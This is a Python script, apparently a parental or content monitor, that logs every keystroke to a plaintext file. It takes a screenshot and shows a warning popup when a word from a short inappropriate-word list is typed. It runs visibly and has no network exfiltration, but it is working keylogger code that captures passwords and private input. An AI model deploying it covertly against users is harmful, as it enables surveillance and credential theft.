from pynput.keyboard import Key, Listener
import pyautogui
import os
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import re

# Directory to store logs and screenshots
log_dir = "activity_logs"
screenshot_dir = os.path.join(log_dir, "screenshots")
os.makedirs(screenshot_dir, exist_ok=True)  # Create directories if not present

# File to store key logs
log_file = os.path.join(log_dir, "keystroke_log.txt")

# Inappropriate words list
inappropriate_words = ["war", "bitch", "porn", "terrorism", "gun", "inappropriate", "badword1"]

# Buffer to hold typed keys
typed_keys = []

# Flag to check if an inappropriate word has been typed
inappropriate_word_detected = False

# Function to capture a screenshot with a timestamp
def capture_screenshot():
    try:
        # Generate a timestamped filename for the screenshot
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")

        # Capture the screenshot (adjust quality/resolution if needed)
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        print(f"Screenshot saved at: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"Failed to capture screenshot: {e}")
        return None

# Function to show a pop-up alert for inappropriate words
def show_alert(word, screenshot_path=None):
    try:
        root = tk.Tk()
        root.withdraw()  # Hide the root window
        message = f"Alert: '{word}' is inappropriate!"
        if screenshot_path:
            message += f"\nScreenshot saved at:\n{screenshot_path}"
        messagebox.showwarning("Inappropriate Word Detected", message)
        root.quit()
    except Exception as e:
        print(f"Error showing alert: {e}")

# Function to handle key presses
def on_press(key):
    global typed_keys, inappropriate_word_detected
    try:
        if hasattr(key, 'char') and key.char is not None:
            typed_keys.append(key.char)
        elif key == Key.space:
            typed_keys.append(" ")  # Word is completed at space
        elif key == Key.enter:
            typed_keys.append("\n")  # Word is completed at Enter
            # Check if inappropriate word was typed
            typed_string = "".join(typed_keys).lower()

            # Match only words (ignores punctuation and spaces)
            typed_words = re.findall(r'\b\w+\b', typed_string)

            # Check if any inappropriate word was typed before pressing Enter
            for word in typed_words:
                if word in inappropriate_words:
                    print(f"\n[ALERT] Inappropriate content detected: {word}\n")
                    screenshot_path = capture_screenshot()  # Capture screenshot
                    show_alert(word, screenshot_path)  # Show pop-up alert with screenshot info
                    with open(log_file, "a") as log:
                        log.write(f"\n[ALERT] Inappropriate content detected: {word}\n")
                        if screenshot_path:
                            log.write(f"Screenshot saved at: {screenshot_path}\n")
                    inappropriate_word_detected = True  # Set flag to true if inappropriate word detected
                    break

        elif key == Key.tab:
            typed_keys.append("\t")  # Word is completed at Tab
        elif key == Key.backspace and typed_keys:
            typed_keys.pop()  # Remove last character on Backspace
        else:
            typed_keys.append(f"[{key}]")  # Handle special keys

        # Write the current key to the log file (if necessary)
        if typed_keys:
            with open(log_file, "a") as log:
                log.write(typed_keys[-1])  # Log the last pressed key

    except Exception as e:
        print(f"Error in key logging: {e}")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        print("Keylogger stopped.")
        return False

# Start the key listener
print("Keylogger is running. Press ESC to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
